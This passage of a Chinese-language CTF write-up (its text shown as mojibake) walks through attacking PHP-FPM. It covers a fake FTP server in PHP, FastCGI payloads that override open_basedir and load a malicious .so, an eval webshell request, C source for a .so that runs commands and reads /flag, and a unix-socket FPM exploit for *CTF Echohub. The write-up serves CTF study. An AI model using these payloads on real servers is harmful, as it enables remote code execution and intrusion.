&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#111">$line&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// TYPE
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">fwrite&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$conn&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;200 xx&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$line&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">fgets&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$conn&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#111">$line&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// SIZE
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">fwrite&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$conn&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;550 xx&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$line&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">fgets&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$conn&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#111">$line&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// EPSV
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">fwrite&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$conn&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;500 wtf&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$line&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">fgets&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$conn&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#111">$line&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// PASV
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// $ip = &amp;#39;192.168.1.4&amp;#39;;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">$ip&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;127.0.0.1&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$port&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">11451&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$porth&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">floor&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$port&lt;/span> &lt;span style="color:#f92672">/&lt;/span> &lt;span style="color:#ae81ff">256&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$portl&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$port&lt;/span> &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#ae81ff">256&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">fwrite&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$conn&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;227 Entering Passive Mode. &amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">str_replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;.&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;,&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$ip&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#34;,&lt;/span>&lt;span style="color:#d88200">$porth&lt;/span>&lt;span style="color:#d88200">,&lt;/span>&lt;span style="color:#d88200">$portl\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$line&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">fgets&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$conn&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#111">$line&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// STOR
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">fwrite&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$conn&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;125 GOGOGO!&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">sleep&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">fwrite&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$conn&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;226 Thanks!&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">fclose&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$conn&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">fclose&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$socket&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>urlencodeä¹‹åä¼ å…¥ï¼Œå†æ‰«ä¸€ä¸‹ç«¯å£å¯ä»¥çœ‹åˆ°46819å¼€æ”¾ï¼Œè¯´æ˜æœåŠ¡æ­£å¸¸ï¼›è¿˜æ˜¯ç”¨ä¹‹å‰pç‰›çš„è„šæœ¬æ„é€ ï¼Œè¿™é‡Œæˆ‘ä»¬è¦ä¿®æ”¹çš„é…ç½®é¡¹æ˜¯è¿™äº›&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;#39;PHP_ADMIN_VALUE&amp;#39;: &amp;#39;allow_url_include = On\nopen_basedir = /\nextension = /tmp/wuhu.so&amp;#39;,
&lt;/code>&lt;/pre>&lt;p>è¦†ç›–æ‰open_basedirçš„åŸæœ‰è®¾ç½®ï¼Œå†åŠ ä¸Š.soæ–‡ä»¶ï¼ˆç¨åä¸Šä¼ ï¼‰ï¼›å…·ä½“çš„payloadä¹Ÿå¯ä»¥ç”¨pç‰›çš„è„šæœ¬é­”æ”¹ä¸€ä¸‹&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211113011624783.png" alt="image-20211113011624783">&lt;/p>
&lt;p>æ³¨é‡Šæ‰157-159å¯¹è¿æ¥çŠ¶æ€çš„åˆ¤æ–­ï¼Œåœ¨191åˆ›å»ºè¿æ¥å‰å°†requestéƒ¨åˆ†ç›´æ¥è¾“å‡ºurlencodeçš„ç‰ˆæœ¬ç„¶åexit(0)ä¸€æ³¢é€€å‡º&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ python fpm.py 127.0.0.1 &lt;span style="color:#d88200">&amp;#39;/var/www/html/index.php&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>%01%01Mp%00%08%00%00%00%01%00%00%00%00%00%00%01%04Mp%02%05%00%00%11%0BGATEWAY_INTERFACEFastCGI/1.0%0E%04REQUEST_METHODPOST%0F%17SCRIPT_FILENAME/var/www/html/index.php%0B%17SCRIPT_NAME/var/www/html/index.php%0C%00QUERY_STRING%0B%17REQUEST_URI/var/www/html/index.php%0D%01DOCUMENT_ROOT/%0F%0ESERVER_SOFTWAREphp/fcgiclient%0B%09REMOTE_ADDR127.0.0.1%0B%04REMOTE_PORT9985%0B%09SERVER_ADDR127.0.0.1%0B%02SERVER_PORT80%0B%09SERVER_NAMElocalhost%0F%08SERVER_PROTOCOLHTTP/1.1%0C%10CONTENT_TYPEapplication/text%0E%02CONTENT_LENGTH25%09%1FPHP_VALUEauto_prepend_file%20%3D%20php%3A//input%0F%40PHP_ADMIN_VALUEallow_url_include%20%3D%20On%0Aopen_basedir%20%3D%20/%0Aextension%20%3D%20/tmp/wuhu.so%01%04Mp%00%00%00%00%01%05Mp%00%19%00%00%3C%3Fphp%20phpinfo%28%29%3B%20exit%3B%20%3F%3E%01%05Mp%00%00%00%00
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>/?glzjin=eval($_POST[%27a%27]);
POST: a=$payload=urldecode(&amp;#39;%01%01%29%BE%00%08%00%00%00%01%00%00%00%00%00%00%01%04%29%BE%02%05%00%00%11%0BGATEWAY_INTERFACEFastCGI/1.0%0E%04REQUEST_METHODPOST%0F%17SCRIPT_FILENAME/var/www/html/index.php%0B%17SCRIPT_NAME/var/www/html/index.php%0C%00QUERY_STRING%0B%17REQUEST_URI/var/www/html/index.php%0D%01DOCUMENT_ROOT/%0F%0ESERVER_SOFTWAREphp/fcgiclient%0B%09REMOTE_ADDR127.0.0.1%0B%04REMOTE_PORT9985%0B%09SERVER_ADDR127.0.0.1%0B%02SERVER_PORT80%0B%09SERVER_NAMElocalhost%0F%08SERVER_PROTOCOLHTTP/1.1%0C%10CONTENT_TYPEapplication/text%0E%02CONTENT_LENGTH25%09%1FPHP_VALUEauto_prepend_file%20%3D%20php%3A//input%0F%40PHP_ADMIN_VALUEallow_url_include%20%3D%20On%0Aopen_basedir%20%3D%20/%0Aextension%20%3D%20/tmp/wuhu.so%01%04%29%BE%00%00%00%00%01%05%29%BE%00%19%00%00%3C%3Fphp%20phpinfo%28%29%3B%20exit%3B%20%3F%3E%01%05%29%BE%00%00%00%00&amp;#39;);var_dump(file_put_contents(&amp;#39;ftp://127.0.0.1:46819/wuhu&amp;#39;,$payload));
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211114223615660.png" alt="image-20211114223615660">&lt;/p>
&lt;p>å†™æ¶æ„.so&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#define _GNU_SOURCE
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdlib.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">__attribute__&lt;/span> &lt;span style="color:#111">((&lt;/span>&lt;span style="color:#111">__constructor__&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#111">preload&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">void&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;ls / -al &amp;gt; /tmp/p1.txt&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;find / -perm -4000 2&amp;gt;/tmp/p2.txt&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;cat /flag &amp;gt; /tmp/p3.txt&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>gcc wuhu.c -o wuhu.so --shared -fPIC
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ä¼ .so&lt;/p>
&lt;pre tabindex="0">&lt;code>/?glzjin=eval($_POST[%27a%27]);
POST:
a=var_dump(file_put_contents(&amp;#39;/tmp/wuhu.so&amp;#39;,$_POST[&amp;#39;data&amp;#39;]));&amp;amp;data=xxxxxxxxxxxxxxxxxxx
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211114224351897.png" alt="image-20211114224351897">&lt;/p>
&lt;p>è¯•ç€æ‰§è¡Œä¸€ä¸‹å‘½ä»¤ï¼ŒæˆåŠŸè§£é™¤open_basedirçš„é™åˆ¶&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211114231135348.png" alt="image-20211114231135348">&lt;/p>
&lt;p>ä½†æ˜¯ä¸€æ ·çš„æ“ä½œä¹‹åå°±æ‰§è¡Œä¸äº†äº†â€¦â€¦å°±ä¸Šé¢è¿™ä¸ªé¡µé¢ï¼Œå°±æ­£å¸¸å‡ºæ¥äº†ç¬¬ä¸€æ¬¡ï¼Œç„¶åå°±ä¸è¡Œäº†ï¼Œéå¸¸çš„ç¦»è°±å•Šå•Šå•Šå•Šå•Š&lt;/p>
&lt;p>æ­£å¸¸æ¥è¯´ï¼Œåªæœ‰open_basedirè¢«è§£æ”¾åæ‰å¯ä»¥scandir(&amp;rsquo;/&amp;rsquo;)ï¼ˆæ²¡æœ‰çš„è¯æ˜¯åªå¯ä»¥scandir(&amp;rsquo;/var/www/html&amp;rsquo;)ï¼‰ï¼Œè€Œæ—¢ç„¶è¿™æ ·å¯ä»¥æ‰§è¡ŒæˆåŠŸå°±è¯´æ˜å¼€å§‹çš„fpmæµé‡ä¸€å®šè¢«æ­£å¸¸æ‰“å‡ºå»äº†ï¼Œå†åŠ ä¸Š.soä¹Ÿè¢«å†™å…¥ï¼ˆæˆ‘åˆ°dockerä¸Šçœ‹äº†ï¼‰ï¼Œé‚£ä¹ˆ.soä¸€å®šä¼šåœ¨phpæ‰§è¡Œæ—¶è¢«è§¦å‘ï¼Œä¸€å®šæ˜¯å¯ä»¥æ‰§è¡Œ.soä¸­æˆ‘ä»¬å†™çš„å‘½ä»¤çš„ï¼›ä½†æ˜¯ç°åœ¨ç«Ÿç„¶è¿scandir(&amp;rsquo;/&amp;rsquo;)éƒ½åªèƒ½æ‰§è¡Œä¸€æ¬¡ ï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿåé¢å°±éƒ½å¤±è´¥äº†ï¼Œæ›´ä¸è¦è¯´.soä¸­çš„å‘½ä»¤äº†ï¼Œè‚¯å®šæ›´æ˜¯æ²¡æœ‰æ‰§è¡Œ&lt;/p>
&lt;p>ä¹‹ååˆå°è¯•äº†å¾ˆå¤šæ¬¡ï¼Œ.soæ­£å¸¸ä¸Šä¼ ï¼Œæœ€å¼€å§‹æ‰“å‘fpmçš„æµé‡ä¹Ÿåˆæ‰“äº†å‡ éï¼Œå¤±è´¥ï¼›å†ä¹‹å.soä¹Ÿä¸èƒ½æ­£å¸¸ä¸Šä¼ äº†ï¼Œæœ€åˆçš„é‚£ä¸ªæµé‡ä¹Ÿæ‰“ä¸æˆäº†ï¼Œåªèƒ½å›æ˜¾int(xxx)ï¼Œä½†æ˜¯æ²¡æœ‰eval()çš„å›æ˜¾ï¼Œè¯´æ˜è¿˜æ˜¯ä¸æ­£å¸¸ï¼Œç„¶åä»–å¦ˆçš„ï¼Œé—´æˆ–æœ‰ä¸€ä¸¤æ¬¡èƒ½æˆåŠŸï¼Œç”šè‡³æˆ‘éƒ½åˆåœ¨/tmpç›®å½•ä¸‹å†™äº†åˆ«çš„æ–‡ä»¶ï¼ˆå¦‚æœå‰é¢çš„æµé‡æ²¡æ­£å¸¸æ‰“å‡ºå»çš„è¯æ˜¯ç»å¯¹ä¸å¯èƒ½åšåˆ°çš„ï¼Œè‚¯å®šæ˜¯bool(false)ï¼‰ï¼Œä½†æ˜¯ä½†æ˜¯ä½†æ˜¯åˆæ˜¯ä¸€ç§’ç ´åŠŸï¼ŒçœŸæ˜¯ä¸ç†è§£äº†ï¼Œå®Œå…¨æ˜¯è·Ÿå‰é¢ä¸€æ¨¡ä¸€æ ·çš„payloadï¼Œä½†æ˜¯å°±ä»–å¦ˆç„å­¦ï¼Œåäº†&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211115014616324.png" alt="image-20211115014616324">&lt;/p>
&lt;p>ä¸æƒ³å†è€—å¤ªå¤šæ—¶é—´åœ¨è¿™ä¸ªé¢˜ä¸Šäº†ï¼Œå®åœ¨æ˜¯ç»·ä¸ä½äº†ï¼ˆè°ƒäº†å¿«1å¤©äº†ï¼‰ï¼ŒåŸºæœ¬ä¹Ÿç®—æ˜¯æ‰“é€šäº†ï¼ˆæ¯•ç«Ÿå°±å·®ä¸€ç‚¹ç‚¹å•Šå•Šå•Šå•Šå•Š æˆ‘æˆªå›¾è¿˜æœ‰å‘¢ï¼‰ï¼ˆå…¶å®æ˜¯æ‡’çš„é‡ç½®dockerå†å°è¯•äº† æˆ‘çš„ï¼‰ï¼Œæˆ‘çŒœæµ‹å‡ºé”™çš„ç‚¹åœ¨äºé‚£ä¸ªå¼€åœ¨46819ç«¯å£çš„ftpæœåŠ¡å™¨ä¸ç¨³å®šï¼Œå®ƒåœ¨å¤„ç†è¿™è¾¹ftpæ‰“å‡ºçš„æµé‡æ—¶å¯èƒ½æ²¡æœ‰æ­£å¸¸çš„å¤„ç†ï¼Œå†åŠ ä¸Šæ¥å›è°ƒæ•´payloadæ‰“äº†å¤ªå¤šæ¬¡äº†ï¼Œå¯èƒ½ä¹‹å‰çš„é”™è¯¯ç´¯ç§¯åˆ°åé¢ï¼Œæ¯”å¦‚æŸæ¬¡æ²¡æœ‰urlencodeä¹‹ç±»çš„ï¼Œæå¾—ç¯å¢ƒä¹Ÿä¸æ­£å¸¸äº†&lt;/p>
&lt;h4 id="è“å¸½æ¯-2021one-pointer-php">***[è“å¸½æ¯ 2021]One Pointer PHP&lt;/h4>
&lt;hr>
&lt;p>yysyï¼Œç¡®å®æ²¡æ—¶é—´å¤ç°ï¼ˆå¤ç°èµµæ€»çš„é¢˜è®©æˆ‘æœ‰å¿ƒç†é˜´å½±äº†ï¼‰&lt;/p>
&lt;p>æˆ‘å°±å…ˆäº‘ä¸€ä¸‹ï¼Œå¯¹8èµ·&lt;/p>
&lt;p>å‚è€ƒï¼š&lt;a href="http://www.yang99.top/index.php/archives/52/">wp1&lt;/a> | &lt;a href="https://ha1c9on.top/2021/04/29/lmb_one_pointer_php/">wp2&lt;/a>&lt;/p>
&lt;h3 id="æ”»å‡»unix-socketæ¨¡å¼ä¸‹çš„php-fpm">æ”»å‡»unix socketæ¨¡å¼ä¸‹çš„php-fpm&lt;/h3>
&lt;p>ç”±äºunix socketæ˜¯è¯»å–/run/php/php7.4-fpm.sockè¿›è¡Œå†…éƒ¨é€šä¿¡ï¼Œé‚£å¿…ç„¶æ˜¯ä¸èƒ½æ‰“è¿œç¨‹ï¼Œç”¨çš„æ˜¯&lt;code>stream_socket_client&lt;/code>å»ºç«‹ä¸€ä¸ªunix socketè¿æ¥ï¼Œç„¶åå†™å…¥tcpæµæ¥é€šä¿¡&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span> &lt;span style="color:#111">$sock&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#75af00">stream_socket_client&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;unix:///run/php/php7.3-fpm.sock&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>&lt;span style="color:#75af00">fputs&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$sock&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#75af00">base64_decode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_POST&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;A&amp;#39;&lt;/span>&lt;span style="color:#111">]));&lt;/span>&lt;span style="color:#75af00">var_dump&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">fread&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$sock&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">4096&lt;/span>&lt;span style="color:#111">));&lt;/span>&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="ctf-2019echohub">[*CTF 2019]Echohub&lt;/h4>
&lt;p>å‰é¢çš„pwnéƒ¨åˆ†æˆ‘æ˜¯ä¸å¤ªèƒ½çœ‹æ‡‚ï¼ˆè‡³å°‘ç›®å‰ï¼‰ï¼Œå°±ç®€å•è¯´è¯´åé¢çš„webéƒ¨åˆ†ï¼›&lt;a href="https://mochazz.github.io/2019/05/03/2019%E6%98%9FCTF%E4%B9%8BWeb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/#Echohub">è¿™é‡Œæ˜¯å‚è€ƒwp&lt;/a>&lt;/p>
&lt;p>ä»phpinfoå¯ä»¥çœ‹åˆ°disable_functions&lt;/p>
&lt;pre tabindex="0">&lt;code>file_get_contents,file_put_contents,fwrite,file,chmod,chown,copy,link,fflush,mkdir,popen,rename,touch,unlink,pcntl_alarm,move_upload_file,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,fsockopen,pfsockopen,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,curl_init,curl_exec,curl_multi_init,curl_multi_exec,dba_open,dba_popen,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail,dl,putenv
&lt;/code>&lt;/pre>&lt;p>è€ƒè™‘ç”¨&lt;code>create_function&lt;/code>æ¥rceï¼Œä¸è¿‡è¿˜æ˜¯ç»•ä¸è¿‡disable_functionsæ¥æ‰§è¡Œ/readflag&lt;/p>
&lt;p>ä¸è¿‡è·‘ä¸€ä¸‹ç»™å‡ºçš„dockerï¼Œå¯ä»¥çœ‹åˆ°ç”¨unix socketæ¨¡å¼è¿è¡Œçš„php-fpm&lt;/p>
&lt;p>é¢˜ç›®ç¯å¢ƒå®‰è£…äº†apacheæœåŠ¡å™¨å’Œapache-moduleæ¨¡å¼çš„phpæ¨¡å—ï¼ˆè¿™ä¸ªå°±æ˜¯é¢˜ç›®ç¯å¢ƒï¼‰ï¼Œä½†æ˜¯fpmä¹Ÿå®‰è£…äº†å¹¶ä¸”å¯åŠ¨&lt;/p>
&lt;p>fpmæ¨¡å¼çš„php.iniä¸phpinfoä¸­æ˜¾ç¤ºçš„ä¸åŒï¼Œæ˜¯ç‹¬ç«‹çš„ï¼Œdisable_funtcionsçš„é™åˆ¶å®½æ¾å¾ˆå¤šï¼Œæˆ‘ä»¬æ¥æ‰“å®ƒæ¥rceï¼Œexpå°±æ˜¯ä¸Šé¢é‚£ä¸ª&lt;/p>
&lt;hr>
&lt;p>æ‹–æ‹–æ‹‰æ‹‰å››äº”å¤©ï¼Œæ€»ç®—æ˜¯æŠ½ç©ºç»™æ€»ç»“å®Œäº†ï¼Œå¯¹åšé¢˜å’Œå­¦ä¹ æ–¹é¢åˆæœ‰äº†ä¸€äº›èˆ¹æ–°çš„ç†è§£ï¼Œè¿˜æ˜¯æœ‰å¾ˆå¤šæ”¶è·çš„&lt;/p>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
ä»¥ä¸‹æ˜¯æœ¬æ–‡ä¸­æ¶‰åŠåˆ°çš„ å’Œæˆ‘å­¦ä¹ æ—¶çœ‹è¿‡çš„æ‰€æœ‰æ–‡ç« çš„é“¾æ¥ æ¯æ—¥æ„Ÿè°¢äº’è”ç½‘çš„ä¸°å¯Œèµ„æºï¼ˆ
&lt;/h4>
&lt;/summary>
&lt;p>&lt;a href="https://blog.csdn.net/shreck66/article/details/50355729">fastcgiåè®®åˆ†æä¸å®ä¾‹&lt;/a> | &lt;a href="https://www.kancloud.cn/digest/php-src/136260">php-fpm ä¸ Nginxä¼˜åŒ–æ€»ç»“&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://evoa.me/archives/6/">PHP è¿æ¥æ–¹å¼ &amp;amp; PHP-FPMæœªæˆæƒè®¿é—®æ¼æ´ &amp;amp; *CTF echohub&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://xz.aliyun.com/t/5598">æµ…æphp-fpmçš„æ”»å‡»æ–¹å¼&lt;/a>&lt;/p>
